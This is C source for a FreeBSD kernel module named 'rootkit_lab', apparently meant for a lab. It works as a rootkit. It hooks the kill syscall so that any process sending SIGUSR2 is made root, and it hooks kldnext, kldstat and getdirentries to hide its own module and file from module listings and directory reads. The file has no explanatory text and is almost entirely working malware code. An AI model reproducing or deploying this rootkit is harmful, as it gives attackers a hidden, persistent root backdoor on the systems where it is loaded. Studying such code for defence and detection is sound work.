#include <sys/param.h>
#include <sys/kernel.h>
#include <sys/module.h>
#include <sys/systm.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/syscall.h>
#include <sys/dirent.h>
#include <sys/linker.h>
#include <sys/malloc.h>
#include <sys/mutex.h>
#include <sys/proc.h>
#include <sys/ucred.h>
#include <sys/signal.h>

#define RK_MAGIC_SIG SIGUSR2

extern int kern_kldstat(struct thread *, int, struct kld_file_stat *);

MALLOC_DEFINE(M_RK, "rootkit", "rootkit lab");

static const char *rk_hidden[] = {
	"rootkit_lab.ko",
};

static sy_call_t *rk_kill_orig;
static sy_call_t *rk_kldnext_orig;
static sy_call_t *rk_kldstat_orig;
static sy_call_t *rk_getdirentries_orig;

static void
rk_elevate(struct thread *td)
{
	struct proc *p;
	struct ucred *newcred, *oldcred;
	gid_t gid0 = 0;

	p = td->td_proc;

	newcred = crget();
	PROC_LOCK(p);
	oldcred = crcopysafe(p, newcred);
	newcred->cr_uid = 0;
	newcred->cr_ruid = 0;
	newcred->cr_svuid = 0;
	newcred->cr_rgid = 0;
	newcred->cr_svgid = 0;
	crsetgroups(newcred, 1, &gid0);
	proc_set_cred(p, newcred);
	PROC_UNLOCK(p);
	crfree(oldcred);
}

static int
rk_kill(struct thread *td, void *uap)
{
	struct kill_args *u = uap;

	if (u->signum == RK_MAGIC_SIG)
	{
		rk_elevate(td);
		return (0);
	}

	return ((*rk_kill_orig)(td, uap));
}

static boolean_t
rk_is_self(const struct kld_file_stat *st)
{
	caddr_t self = (caddr_t)(uintptr_t)&rk_is_self;

	return (self >= st->address && self < st->address + st->size);
}

static int
rk_kldnext(struct thread *td, void *uap)
{
	struct kldnext_args args;
	struct kld_file_stat st;
	register_t id;
	int error;

	error = (*rk_kldnext_orig)(td, uap);
	if (error != 0)
		return (error);

	id = td->td_retval[0];
	while (id != 0)
	{
		if (kern_kldstat(td, (int)id, &st) != 0)
			break;
		if (!rk_is_self(&st))
			break;
		args.fileid = (int)id;
		error = (*rk_kldnext_orig)(td, &args);
		if (error != 0)
		{
			td->td_retval[0] = 0;
			return (0);
		}
		id = td->td_retval[0];
	}
	td->td_retval[0] = id;

	return (0);
}

static int
rk_kldstat(struct thread *td, void *uap)
{
	struct kldstat_args *u = uap;
	struct kld_file_stat st;

	if (kern_kldstat(td, u->fileid, &st) == 0 && rk_is_self(&st))
		return (ENOENT);

	return ((*rk_kldstat_orig)(td, uap));
}

static boolean_t
rk_name_hidden(const char *name, size_t len)
{
	size_t i;

	for (i = 0; i < nitems(rk_hidden); i++)
	{
		if (strlen(rk_hidden[i]) == len &&
			memcmp(name, rk_hidden[i], len) == 0)
			return (TRUE);
	}

	return (FALSE);
}

static int
rk_getdirentries(struct thread *td, void *uap)
{
	struct getdirentries_args *u = uap;
	struct dirent *d;
	char *buf;
	size_t cnt, off, out;
	int error, tries;

	for (tries = 0; tries < 32; tries++)
	{
		error = (*rk_getdirentries_orig)(td, uap);
		if (error != 0)
			return (error);

		cnt = (size_t)td->td_retval[0];
		if (cnt == 0)
			return (0);

		buf = malloc(cnt, M_RK, M_WAITOK);
		if (copyin(u->buf, buf, cnt) != 0)
		{
			free(buf, M_RK);
			return (0);
		}

		out = 0;
		for (off = 0; off < cnt;)
		{
			d = (struct dirent *)(buf + off);
			if (d->d_reclen == 0 || off + d->d_reclen > cnt)
				break;
			if (!rk_name_hidden(d->d_name, d->d_namlen))
			{
				if (out != off)
					memmove(buf + out, buf + off, d->d_reclen);
				out += d->d_reclen;
			}
			off += d->d_reclen;
		}

		if (out != 0)
		{
			if (copyout(buf, u->buf, out) != 0)
				out = 0;
			free(buf, M_RK);
			td->td_retval[0] = out;
			return (0);
		}
		free(buf, M_RK);
	}

	td->td_retval[0] = 0;

	return (0);
}

static int
rk_modevent(module_t mod, int type, void *arg)
{
	(void)mod;
	(void)arg;

	switch (type)
	{
	case MOD_LOAD:
		rk_kill_orig = sysent[SYS_kill].sy_call;
		sysent[SYS_kill].sy_call = rk_kill;
		rk_kldnext_orig = sysent[SYS_kldnext].sy_call;
		sysent[SYS_kldnext].sy_call = rk_kldnext;
		rk_kldstat_orig = sysent[SYS_kldstat].sy_call;
		sysent[SYS_kldstat].sy_call = rk_kldstat;
		rk_getdirentries_orig = sysent[SYS_getdirentries].sy_call;
		sysent[SYS_getdirentries].sy_call = rk_getdirentries;
		printf("rootkit-lab: loaded\n");
		break;
	case MOD_UNLOAD:
		sysent[SYS_kill].sy_call = rk_kill_orig;
		sysent[SYS_kldnext].sy_call = rk_kldnext_orig;
		sysent[SYS_kldstat].sy_call = rk_kldstat_orig;
		sysent[SYS_getdirentries].sy_call = rk_getdirentries_orig;
		printf("rootkit-lab: unloaded\n");
		break;
	default:
		break;
	}

	return (0);
}

static moduledata_t rk_mod = {
	"rootkit_lab",
	rk_modevent,
	NULL};

MODULE_VERSION(rootkit_lab, 1);
DECLARE_MODULE(rootkit_lab, rk_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
